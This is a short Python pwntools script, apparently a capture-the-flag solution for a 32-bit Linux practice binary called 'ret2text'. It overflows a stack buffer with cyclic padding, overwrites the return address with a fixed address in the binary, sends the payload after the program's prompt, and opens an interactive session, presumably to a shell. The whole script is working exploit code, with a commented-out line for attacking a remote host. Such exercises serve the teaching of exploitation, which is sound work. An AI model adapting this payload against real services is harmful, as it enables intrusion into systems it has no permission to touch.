from pwn import *

context(log_level='debug', arch='i386', os='linux')
pwnfile = './ret2text'
# io = remote('ipaddr', port)
io = process(pwnfile)
elf = ELF(pwnfile)
rop = ROP(pwnfile)

padding2ebp = 0x6C # from the var to ebp
padding = padding2ebp + context.word_size//8

#gdb.attach(io)
#pause()
ret_addr = 0x0804863A
payload = flat([cyclic(padding), ret_addr])
delimiter = "do you know anything?\n"
io.sendlineafter(delimiter, payload)
io.interactive()
